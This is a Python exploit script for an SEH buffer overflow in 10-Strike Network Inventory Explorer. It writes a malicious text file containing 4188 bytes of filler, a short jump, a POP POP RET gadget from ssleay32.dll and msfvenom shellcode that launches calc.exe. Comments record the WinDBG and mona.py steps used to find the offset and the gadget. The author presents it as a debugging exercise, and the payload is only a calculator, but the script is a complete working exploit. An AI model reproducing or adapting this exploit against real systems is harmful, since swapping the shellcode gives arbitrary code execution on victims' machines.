from struct import *
import sys

# My goal was to learn a little bit more WinDBG

"""
1. before anything
0:007> !exchain
3 stack frames, scanning for handlers...
Frame 0x01: ntdll!DbgUiRemoteBreakin+0x38 (00000000`76ec7ef8)
  ehandler ntdll!_C_specific_handler (00000000`76de850c)
Frame 0x02: ntdll!RtlUserThreadStart+0x25 (00000000`76e34a00)
  ehandler ntdll!_C_specific_handler (00000000`76de850c)

2. overwrite SEH handler
0:000:x86> !exchain
000000000018f8f0: 0000000041414141
Invalid exception stack at 0000000041414141

IP_ON_HEAP:  0000000041414141
IP_IN_FREE_BLOCK: 41414141

3. overwrite with cyclic
0:000:x86> !exchain
000000000018f8c8: 000000006a46376a
Invalid exception stack at 0000000046366a46

[*] Exact match at offset 4188

# working on importing mona.py into WinDBG 
4. modules
 Log data, item 4
 Address=0BADF00D
 Message= 0x10000000 | 0x10030000 | 0x00030000 | False  | False   | False |  False   | False  | 0.9.8d [ssleay32.dll] (C:\Program Files (x86)\10-Strike Network Inventory Explorer\ssleay32.dll)

5. pop pop ret
 Log data, item 22
 Address=10012A8D
 Message=  0x10012a8d : pop esi # pop ecx # ret  |  {PAGE_EXECUTE_READ} [ssleay32.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v0.9.8d (C:\Program Files (x86)\10-Strike Network Inventory Explorer\ssleay32.dll)


"""
# msfvenom -p windows/exec CMD=calc.exe -b '\x00\x0a\x0d' -f python -v shellcode_calc EXITFUNC=process
shellcode_calc =  ""
shellcode_calc += "\xda\xc5\xd9\x74\x24\xf4\xba\xed\xe1\x28"
shellcode_calc += "\x6d\x58\x33\xc9\xb1\x31\x83\xc0\x04\x31"
shellcode_calc += "\x50\x14\x03\x50\xf9\x03\xdd\x91\xe9\x46"
shellcode_calc += "\x1e\x6a\xe9\x26\x96\x8f\xd8\x66\xcc\xc4"
shellcode_calc += "\x4a\x57\x86\x89\x66\x1c\xca\x39\xfd\x50"
shellcode_calc += "\xc3\x4e\xb6\xdf\x35\x60\x47\x73\x05\xe3"
shellcode_calc += "\xcb\x8e\x5a\xc3\xf2\x40\xaf\x02\x33\xbc"
shellcode_calc += "\x42\x56\xec\xca\xf1\x47\x99\x87\xc9\xec"
shellcode_calc += "\xd1\x06\x4a\x10\xa1\x29\x7b\x87\xba\x73"
shellcode_calc += "\x5b\x29\x6f\x08\xd2\x31\x6c\x35\xac\xca"
shellcode_calc += "\x46\xc1\x2f\x1b\x97\x2a\x83\x62\x18\xd9"
shellcode_calc += "\xdd\xa3\x9e\x02\xa8\xdd\xdd\xbf\xab\x19"
shellcode_calc += "\x9c\x1b\x39\xba\x06\xef\x99\x66\xb7\x3c"
shellcode_calc += "\x7f\xec\xbb\x89\x0b\xaa\xdf\x0c\xdf\xc0"
shellcode_calc += "\xdb\x85\xde\x06\x6a\xdd\xc4\x82\x37\x85"
shellcode_calc += "\x65\x92\x9d\x68\x99\xc4\x7e\xd4\x3f\x8e"
shellcode_calc += "\x92\x01\x32\xcd\xf8\xd4\xc0\x6b\x4e\xd6"
shellcode_calc += "\xda\x73\xfe\xbf\xeb\xf8\x91\xb8\xf3\x2a"
shellcode_calc += "\xd6\x37\xbe\x77\x7e\xd0\x67\xe2\xc3\xbd"
shellcode_calc += "\x97\xd8\x07\xb8\x1b\xe9\xf7\x3f\x03\x98"
shellcode_calc += "\xf2\x04\x83\x70\x8e\x15\x66\x77\x3d\x15"
shellcode_calc += "\xa3\x14\xa0\x85\x2f\xf5\x47\x2e\xd5\x09"

seh_handler = pack('I', 0x10012a8d)   # POP POP RET
nseh_handler  = "\xEB\x06\x90\x90"    # JMP short 6 over SEH handler

payload  = "A" * 4188                 # buffer filler
payload += nseh_handler               # short JMP 6
payload += seh_handler                # POP POP RET
payload += "\x90" * 5                 # small nopsled
payload += shellcode_calc             # shellcode calc payload
payload += "D" * 5000                 # padding

try:
    print("[x] 10-strike inventory explorer exploit\n")
    file_payload = open("10-strike-evil.txt", 'w')
    print("[x] Creating a .txt file for out payload")
    file_payload.write(payload)
    print("[x] Writing malicious payload to .txt file")
    file_payload.close()
    print("[x] Load the malicious .txt file to spawn a calculator")
except:
    print("[!] Failed to create malicious .txt")
